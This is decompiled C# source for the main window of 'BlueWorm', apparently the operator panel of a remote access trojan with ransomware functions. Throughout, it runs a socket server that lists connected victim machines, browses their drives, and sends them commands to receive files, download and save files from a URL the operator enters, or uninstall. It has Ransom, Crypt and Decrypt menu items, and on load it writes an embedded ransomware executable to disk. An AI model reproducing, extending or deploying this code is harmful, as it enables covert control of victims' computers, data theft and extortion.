using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace BlueWorm
{
	// Token: 0x0200000D RID: 13
	[DesignerGenerated]
	public partial class Form1 : Form
	{
		// Token: 0x0600004A RID: 74 RVA: 0x000024E5 File Offset: 0x000006E5
		// Note: this type is marked as 'beforefieldinit'.
		[DebuggerNonUserCode]
		static Form1()
		{
			Class9.jBg04XuzOGhUk();
			Form1.list_0 = new List<WeakReference>();
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00003544 File Offset: 0x00001744
		public Form1()
		{
			Class9.jBg04XuzOGhUk();
			base..ctor();
			base.Load += this.Form1_Load;
			base.FormClosing += this.Form1_FormClosing;
			Form1.xuSzpIsch(this);
			this.string_0 = " - Clients Selected= [ y ]  ";
			this.Yy = "||";
			this.s = new SocketServer();
			this.InitializeComponent();
		}

		// Token: 0x0600004C RID: 76 RVA: 0x000035B0 File Offset: 0x000017B0
		[DebuggerNonUserCode]
		private static void xuSzpIsch(object object_0)
		{
			List<WeakReference> obj = Form1.list_0;
			checked
			{
				lock (obj)
				{
					if (Form1.list_0.Count == Form1.list_0.Capacity)
					{
						int num = 0;
						int num2 = 0;
						int num3 = Form1.list_0.Count - 1;
						int num4 = num2;
						for (;;)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							WeakReference weakReference = Form1.list_0[num4];
							if (weakReference.IsAlive)
							{
								if (num4 != num)
								{
									Form1.list_0[num] = Form1.list_0[num4];
								}
								num++;
							}
							num4++;
						}
						Form1.list_0.RemoveRange(num, Form1.list_0.Count - num);
						Form1.list_0.Capacity = Form1.list_0.Count;
					}
					Form1.list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
				}
			}
		}

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x0600004F RID: 79 RVA: 0x00005CE8 File Offset: 0x00003EE8
		// (set) Token: 0x06000050 RID: 80 RVA: 0x00005D00 File Offset: 0x00003F00
		internal virtual MenuStrip MenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				ToolStripItemClickedEventHandler value2 = new ToolStripItemClickedEventHandler(this.MenuStrip1_ItemClicked);
				if (this._MenuStrip1 != null)
				{
					this._MenuStrip1.ItemClicked -= value2;
				}
				this._MenuStrip1 = value;
				if (this._MenuStrip1 != null)
				{
					this._MenuStrip1.ItemClicked += value2;
				}
			}
		}

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x06000051 RID: 81 RVA: 0x00005D58 File Offset: 0x00003F58
		// (set) Token: 0x06000052 RID: 82 RVA: 0x000024F6 File Offset: 0x000006F6
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x06000053 RID: 83 RVA: 0x00005D70 File Offset: 0x00003F70
		// (set) Token: 0x06000054 RID: 84 RVA: 0x00005D88 File Offset: 0x00003F88
		internal virtual ToolStripMenuItem RemoveClientToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RemoveClientToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RemoveClientToolStripMenuItem_Click);
				if (this._RemoveClientToolStripMenuItem != null)
				{
					this._RemoveClientToolStripMenuItem.Click -= value2;
				}
				this._RemoveClientToolStripMenuItem = value;
				if (this._RemoveClientToolStripMenuItem != null)
				{
					this._RemoveClientToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x06000055 RID: 85 RVA: 0x00005DE0 File Offset: 0x00003FE0
		// (set) Token: 0x06000056 RID: 86 RVA: 0x00005DF8 File Offset: 0x00003FF8
		internal virtual ListView l1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._l1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.l1_SelectedIndexChanged);
				if (this._l1 != null)
				{
					this._l1.SelectedIndexChanged -= value2;
				}
				this._l1 = value;
				if (this._l1 != null)
				{
					this._l1.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00005E50 File Offset: 0x00004050
		[DebuggerNonUserCode]
		internal virtual ColumnHeader vmethod_0()
		{
			return this.columnHeader_0;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x000024FF File Offset: 0x000006FF
		[DebuggerNonUserCode]
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void vmethod_1(ColumnHeader WithEventsValue)
		{
			this.columnHeader_0 = WithEventsValue;
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00005E68 File Offset: 0x00004068
		[DebuggerNonUserCode]
		internal virtual ColumnHeader vmethod_2()
		{
			return this.columnHeader_1;
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00002508 File Offset: 0x00000708
		[DebuggerNonUserCode]
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void vmethod_3(ColumnHeader WithEventsValue)
		{
			this.columnHeader_1 = WithEventsValue;
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00005E80 File Offset: 0x00004080
		[DebuggerNonUserCode]
		internal virtual ColumnHeader HdJsnjmybB()
		{
			return this.columnHeader_2;
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00002511 File Offset: 0x00000711
		[DebuggerNonUserCode]
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void vmethod_4(ColumnHeader WithEventsValue)
		{
			this.columnHeader_2 = WithEventsValue;
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00005E98 File Offset: 0x00004098
		[DebuggerNonUserCode]
		internal virtual ColumnHeader vmethod_5()
		{
			return this.columnHeader_3;
		}

		// Token: 0x0600005E RID: 94 RVA: 0x0000251A File Offset: 0x0000071A
		[DebuggerNonUserCode]
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void vmethod_6(ColumnHeader WithEventsValue)
		{
			this.columnHeader_3 = WithEventsValue;
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00005EB0 File Offset: 0x000040B0
		[DebuggerNonUserCode]
		internal virtual ColumnHeader vmethod_7()
		{
			return this.columnHeader_4;
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00002523 File Offset: 0x00000723
		[DebuggerNonUserCode]
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void vmethod_8(ColumnHeader WithEventsValue)
		{
			this.columnHeader_4 = WithEventsValue;
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00005EC8 File Offset: 0x000040C8
		[DebuggerNonUserCode]
		internal virtual ContextMenuStrip vmethod_9()
		{
			return this.contextMenuStrip_0;
		}

		// Token: 0x06000062 RID: 98 RVA: 0x0000252C File Offset: 0x0000072C
		[DebuggerNonUserCode]
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void vmethod_10(ContextMenuStrip WithEventsValue)
		{
			this.contextMenuStrip_0 = WithEventsValue;
		}

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000063 RID: 99 RVA: 0x00005EE0 File Offset: 0x000040E0
		// (set) Token: 0x06000064 RID: 100 RVA: 0x00005EF8 File Offset: 0x000040F8
		internal virtual ToolStripMenuItem AddPortToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._AddPortToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.AddPortToolStripMenuItem_Click);
				if (this._AddPortToolStripMenuItem != null)
				{
					this._AddPortToolStripMenuItem.Click -= value2;
				}
				this._AddPortToolStripMenuItem = value;
				if (this._AddPortToolStripMenuItem != null)
				{
					this._AddPortToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x06000065 RID: 101 RVA: 0x00005F50 File Offset: 0x00004150
		// (set) Token: 0x06000066 RID: 102 RVA: 0x00002535 File Offset: 0x00000735
		internal virtual ToolStripMenuItem RemovePortToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RemovePortToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RemovePortToolStripMenuItem = value;
			}
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00005F68 File Offset: 0x00004168
		[DebuggerNonUserCode]
		internal virtual ImageList vmethod_11()
		{
			return this.imageList_0;
		}

		// Token: 0x06000068 RID: 104 RVA: 0x0000253E File Offset: 0x0000073E
		[DebuggerNonUserCode]
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void vmethod_12(ImageList WithEventsValue)
		{
			this.imageList_0 = WithEventsValue;
		}

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x06000069 RID: 105 RVA: 0x00005F80 File Offset: 0x00004180
		// (set) Token: 0x0600006A RID: 106 RVA: 0x00002547 File Offset: 0x00000747
		internal virtual ToolStripMenuItem RunFileToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RunFileToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RunFileToolStripMenuItem = value;
			}
		}

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x0600006B RID: 107 RVA: 0x00005F98 File Offset: 0x00004198
		// (set) Token: 0x0600006C RID: 108 RVA: 0x00005FB0 File Offset: 0x000041B0
		internal virtual ToolStripMenuItem DiskToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DiskToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DiskToolStripMenuItem_Click);
				if (this._DiskToolStripMenuItem != null)
				{
					this._DiskToolStripMenuItem.Click -= value2;
				}
				this._DiskToolStripMenuItem = value;
				if (this._DiskToolStripMenuItem != null)
				{
					this._DiskToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x0600006D RID: 109 RVA: 0x00006008 File Offset: 0x00004208
		// (set) Token: 0x0600006E RID: 110 RVA: 0x00006020 File Offset: 0x00004220
		internal virtual ToolStripMenuItem LinkToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LinkToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.LinkToolStripMenuItem_Click);
				if (this._LinkToolStripMenuItem != null)
				{
					this._LinkToolStripMenuItem.Click -= value2;
				}
				this._LinkToolStripMenuItem = value;
				if (this._LinkToolStripMenuItem != null)
				{
					this._LinkToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00006078 File Offset: 0x00004278
		[DebuggerNonUserCode]
		internal virtual ImageList vmethod_13()
		{
			return this.imageList_1;
		}

		// Token: 0x06000070 RID: 112 RVA: 0x00002550 File Offset: 0x00000750
		[DebuggerNonUserCode]
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void jrIsFyuFdt(ImageList WithEventsValue)
		{
			this.imageList_1 = WithEventsValue;
		}

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000071 RID: 113 RVA: 0x00006090 File Offset: 0x00004290
		// (set) Token: 0x06000072 RID: 114 RVA: 0x000060A8 File Offset: 0x000042A8
		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				if (this._Button2 != null)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				if (this._Button2 != null)
				{
					this._Button2.Click += value2;
				}
			}
		}

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x06000073 RID: 115 RVA: 0x00006100 File Offset: 0x00004300
		// (set) Token: 0x06000074 RID: 116 RVA: 0x00006118 File Offset: 0x00004318
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				if (this._Button1 != null)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				if (this._Button1 != null)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x06000075 RID: 117 RVA: 0x00006170 File Offset: 0x00004370
		// (set) Token: 0x06000076 RID: 118 RVA: 0x00006188 File Offset: 0x00004388
		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				if (this._Button3 != null)
				{
					this._Button3.Click -= value2;
				}
				this._Button3 = value;
				if (this._Button3 != null)
				{
					this._Button3.Click += value2;
				}
			}
		}

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x06000077 RID: 119 RVA: 0x000061E0 File Offset: 0x000043E0
		// (set) Token: 0x06000078 RID: 120 RVA: 0x000061F8 File Offset: 0x000043F8
		internal virtual ToolStripMenuItem UpdateToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UpdateToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UpdateToolStripMenuItem_Click);
				if (this._UpdateToolStripMenuItem != null)
				{
					this._UpdateToolStripMenuItem.Click -= value2;
				}
				this._UpdateToolStripMenuItem = value;
				if (this._UpdateToolStripMenuItem != null)
				{
					this._UpdateToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00006250 File Offset: 0x00004450
		[DebuggerNonUserCode]
		internal virtual Timer umesxYcZi0()
		{
			return this.timer_0;
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00006268 File Offset: 0x00004468
		[DebuggerNonUserCode]
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void vmethod_14(Timer WithEventsValue)
		{
			EventHandler value = new EventHandler(this.method_9);
			if (this.timer_0 != null)
			{
				this.timer_0.Tick -= value;
			}
			this.timer_0 = WithEventsValue;
			if (this.timer_0 != null)
			{
				this.timer_0.Tick += value;
			}
		}

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x0600007B RID: 123 RVA: 0x000062C0 File Offset: 0x000044C0
		// (set) Token: 0x0600007C RID: 124 RVA: 0x00002559 File Offset: 0x00000759
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x0600007D RID: 125 RVA: 0x000062D8 File Offset: 0x000044D8
		// (set) Token: 0x0600007E RID: 126 RVA: 0x000062F0 File Offset: 0x000044F0
		internal virtual ToolStripMenuItem RansomToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RansomToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RansomToolStripMenuItem_Click);
				if (this._RansomToolStripMenuItem != null)
				{
					this._RansomToolStripMenuItem.Click -= value2;
				}
				this._RansomToolStripMenuItem = value;
				if (this._RansomToolStripMenuItem != null)
				{
					this._RansomToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x0600007F RID: 127 RVA: 0x00006348 File Offset: 0x00004548
		// (set) Token: 0x06000080 RID: 128 RVA: 0x00002562 File Offset: 0x00000762
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x06000081 RID: 129 RVA: 0x00006360 File Offset: 0x00004560
		// (set) Token: 0x06000082 RID: 130 RVA: 0x0000256B File Offset: 0x0000076B
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x06000083 RID: 131 RVA: 0x00006378 File Offset: 0x00004578
		// (set) Token: 0x06000084 RID: 132 RVA: 0x00002574 File Offset: 0x00000774
		internal virtual ProgressBar ProgressBar2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar2 = value;
			}
		}

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x06000085 RID: 133 RVA: 0x00006390 File Offset: 0x00004590
		// (set) Token: 0x06000086 RID: 134 RVA: 0x000063A8 File Offset: 0x000045A8
		internal virtual ToolStripMenuItem CryptToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CryptToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CryptToolStripMenuItem_Click);
				if (this._CryptToolStripMenuItem != null)
				{
					this._CryptToolStripMenuItem.Click -= value2;
				}
				this._CryptToolStripMenuItem = value;
				if (this._CryptToolStripMenuItem != null)
				{
					this._CryptToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x06000087 RID: 135 RVA: 0x00006400 File Offset: 0x00004600
		// (set) Token: 0x06000088 RID: 136 RVA: 0x00006418 File Offset: 0x00004618
		internal virtual ToolStripMenuItem DecryptToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this.hxtBklasYe;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DecryptToolStripMenuItem_Click);
				if (this.hxtBklasYe != null)
				{
					this.hxtBklasYe.Click -= value2;
				}
				this.hxtBklasYe = value;
				if (this.hxtBklasYe != null)
				{
					this.hxtBklasYe.Click += value2;
				}
			}
		}

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x06000089 RID: 137 RVA: 0x00006470 File Offset: 0x00004670
		// (set) Token: 0x0600008A RID: 138 RVA: 0x0000257D File Offset: 0x0000077D
		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		// Token: 0x17000022 RID: 34
		// (get) Token: 0x0600008B RID: 139 RVA: 0x00006488 File Offset: 0x00004688
		// (set) Token: 0x0600008C RID: 140 RVA: 0x00002586 File Offset: 0x00000786
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x17000023 RID: 35
		// (get) Token: 0x0600008D RID: 141 RVA: 0x000064A0 File Offset: 0x000046A0
		// (set) Token: 0x0600008E RID: 142 RVA: 0x000064B8 File Offset: 0x000046B8
		public virtual SocketServer s
		{
			[DebuggerNonUserCode]
			get
			{
				return this.socketServer_0;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				SocketServer.DisConnectedEventHandler value2 = new SocketServer.DisConnectedEventHandler(this.disconnected);
				SocketServer.DataEventHandler value3 = new SocketServer.DataEventHandler(this.data);
				SocketServer.ConnectedEventHandler value4 = new SocketServer.ConnectedEventHandler(this.connected);
				if (this.socketServer_0 != null)
				{
					this.socketServer_0.DisConnected -= value2;
					this.socketServer_0.Data -= value3;
					this.socketServer_0.Connected -= value4;
				}
				this.socketServer_0 = value;
				if (this.socketServer_0 != null)
				{
					this.socketServer_0.DisConnected += value2;
					this.socketServer_0.Data += value3;
					this.socketServer_0.Connected += value4;
				}
			}
		}

		// Token: 0x0600008F RID: 143 RVA: 0x0000258F File Offset: 0x0000078F
		private void Form1_Load(object sender, EventArgs e)
		{
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\Saramatransom[Don`t_Run].exe", Class7.smethod_0());
			this.s = new SocketServer();
			Control.CheckForIllegalCrossThreadCalls = false;
			this.DecryptToolStripMenuItem.Enabled = false;
		}

		// Token: 0x06000090 RID: 144 RVA: 0x000025C9 File Offset: 0x000007C9
		public void connected(int sock)
		{
			this.s.Send(sock, "lolo");
		}

		// Token: 0x06000091 RID: 145 RVA: 0x0000655C File Offset: 0x0000475C
		public void disconnected(int sock)
		{
			try
			{
				this.l1.Items[sock.ToString()].Remove();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000092 RID: 146 RVA: 0x000065A8 File Offset: 0x000047A8
		public void data(int sock, byte[] b)
		{
			string[] array = Strings.Split(Class6.smethod_1(b), "||", -1, CompareMethod.Binary);
			checked
			{
				try
				{
					string left = array[0];
					if (Operators.CompareString(left, "lolo", false) == 0)
					{
						ListViewItem listViewItem = this.l1.Items.Add(sock.ToString(), array[1], Class6.smethod_3(Strings.UCase(array[4])));
						listViewItem.SubItems.Add(this.s.IP(ref sock));
						listViewItem.SubItems.Add(array[2]);
						listViewItem.SubItems.Add(array[3]);
						listViewItem.SubItems.Add(array[4]);
						listViewItem.SubItems.Add(array[5]);
						listViewItem.ToolTipText = Conversions.ToString(sock);
					}
					else if (Operators.CompareString(left, "test", false) == 0)
					{
						Form2 form = (Form2)Class2.Form0_0.OpenForms["openfm" + Conversions.ToString(sock)];
						if (Operators.CompareString(array[1], "Error", false) != 0)
						{
							form.ListView1.Items.Clear();
							string[] array2 = Strings.Split(array[1], "FileManagerSplit", -1, CompareMethod.Binary);
							int num = 0;
							int num2 = array2.Length - 2;
							int num3 = num;
							for (;;)
							{
								int num4 = num3;
								int num5 = num2;
								if (num4 > num5)
								{
									break;
								}
								ListViewItem listViewItem2 = new ListViewItem();
								listViewItem2.Text = array2[num3];
								listViewItem2.SubItems.Add(array2[num3 + 1]);
								if (!listViewItem2.Text.StartsWith("[Drive]") & !listViewItem2.Text.StartsWith("[CD]") & !listViewItem2.Text.StartsWith("[Folder]"))
								{
									long num6 = Convert.ToInt64(listViewItem2.SubItems[1].Text);
									if (num6 > 1073741824L)
									{
										double value = (double)num6 / 1073741824.0;
										listViewItem2.SubItems[1].Text = Math.Round(value, 2).ToString() + " GB";
									}
									else if (num6 > 1048576L)
									{
										double value2 = (double)num6 / 1048576.0;
										listViewItem2.SubItems[1].Text = Math.Round(value2, 2).ToString() + " MB";
									}
									else if (num6 > 1024L)
									{
										double value3 = (double)num6 / 1024.0;
										listViewItem2.SubItems[1].Text = Math.Round(value3, 2).ToString() + " KB";
									}
									else
									{
										listViewItem2.SubItems[1].Text = num6.ToString() + " B";
									}
									listViewItem2.Tag = Convert.ToInt64(array2[num3 + 1]);
								}
								if (listViewItem2.Text.StartsWith("[Drive]"))
								{
									listViewItem2.ImageIndex = 0;
									listViewItem2.Text = listViewItem2.Text.Substring(7);
								}
								else if (listViewItem2.Text.StartsWith("[CD]"))
								{
									listViewItem2.ImageIndex = 1;
									listViewItem2.Text = listViewItem2.Text.Substring(4);
								}
								else if (listViewItem2.Text.StartsWith("[Folder]"))
								{
									listViewItem2.ImageIndex = 2;
									listViewItem2.Text = listViewItem2.Text.Substring(8);
								}
								form.ListView1.Items.Add(listViewItem2);
								num3++;
								num3++;
							}
						}
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x000025DC File Offset: 0x000007DC
		private void method_0(object sender, EventArgs e)
		{
			Class2.umavbhbSM.Form7.Show();
		}

		// Token: 0x06000094 RID: 148 RVA: 0x000025ED File Offset: 0x000007ED
		private void method_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000095 RID: 149 RVA: 0x0000696C File Offset: 0x00004B6C
		private void method_2(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.ShowDialog();
			FileInfo fileInfo = new FileInfo(openFileDialog.FileName);
			if (openFileDialog.FileName.Length > 0)
			{
				try
				{
					foreach (object obj in this.l1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						this.s.Send(Conversions.ToInteger(listViewItem.ToolTipText), "sendfile||" + fileInfo.Name + "||" + Convert.ToBase64String(File.ReadAllBytes(openFileDialog.FileName)));
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00006A34 File Offset: 0x00004C34
		private void method_3(object sender, EventArgs e)
		{
			string str = Interaction.InputBox("Enter Direct URL", "Download", "", -1, -1);
			string str2 = Interaction.InputBox("Enter the name of the file", "Download", "", -1, -1);
			try
			{
				foreach (object obj in this.l1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					this.s.Send(Conversions.ToInteger(listViewItem.ToolTipText), "download||" + str + "||" + str2);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00006AEC File Offset: 0x00004CEC
		private void RemoveClientToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.l1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					this.s.Send(Conversions.ToInteger(listViewItem.ToolTipText), "Uninstall");
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000098 RID: 152 RVA: 0x000025EF File Offset: 0x000007EF
		private void method_4(object sender, EventArgs e)
		{
			Class2.umavbhbSM.Form6.Show();
		}

		// Token: 0x06000099 RID: 153 RVA: 0x000025ED File Offset: 0x000007ED
		private void yuhBcgweqU(object sender, EventArgs e)
		{
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00002600 File Offset: 0x00000800
		[MethodImpl(MethodImplOptions.NoOptimization)]
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			Class2.umavbhbSM.Form2.Close();
			ProjectData.EndApp();
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00002616 File Offset: 0x00000816
		private void AddPortToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Class2.umavbhbSM.Form3.Show();
		}

		// Token: 0x0600009C RID: 156 RVA: 0x000025ED File Offset: 0x000007ED
		private void l1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600009D RID: 157 RVA: 0x000025ED File Offset: 0x000007ED
		private void method_5(object sender, EventArgs e)
		{
		}

		// Token: 0x0600009E RID: 158 RVA: 0x0000696C File Offset: 0x00004B6C
		private void DiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.ShowDialog();
			FileInfo fileInfo = new FileInfo(openFileDialog.FileName);
			if (openFileDialog.FileName.Length > 0)
			{
				try
				{
					foreach (object obj in this.l1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						this.s.Send(Conversions.ToInteger(listViewItem.ToolTipText), "sendfile||" + fileInfo.Name + "||" + Convert.ToBase64String(File.ReadAllBytes(openFileDialog.FileName)));
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x0600009F RID: 159 RVA: 0x00006A34 File Offset: 0x00004C34
		private void LinkToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string str = Interaction.InputBox("Enter Direct URL", "Download", "", -1, -1);
			string str2 = Interaction.InputBox("Enter the name of the file", "Download", "", -1, -1);
			try
			{
				foreach (object obj in this.l1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					this.s.Send(Conversions.ToInteger(listViewItem.ToolTipText), "download||" + str + "||" + str2);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x000025ED File Offset: 0x000007ED
		private void MenuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
		{
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x000025EF File Offset: 0x000007EF
		private void method_6(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Class2.umavbhbSM.Form6.Show();
		}

